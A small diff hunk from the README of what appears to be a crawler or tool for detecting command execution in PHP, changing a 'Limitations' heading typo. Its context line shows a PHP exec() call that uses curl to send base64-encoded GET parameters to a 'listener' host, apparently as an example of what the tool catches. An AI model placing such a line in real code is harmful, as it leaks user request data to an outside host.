@@ -92,7 +92,7 @@ exec("curl http://listener:8888/?" . base64_encode("get=" . json_encode($_GET)))
 - Move "contains" to regex, like for `backticks` or `"fct_name"(fct_params)`)
 - Improve speed (limitation with logs.txt LOCK)
 
-# Limiations
+# Limitaions
 
 ## The crawler is GET-only
 
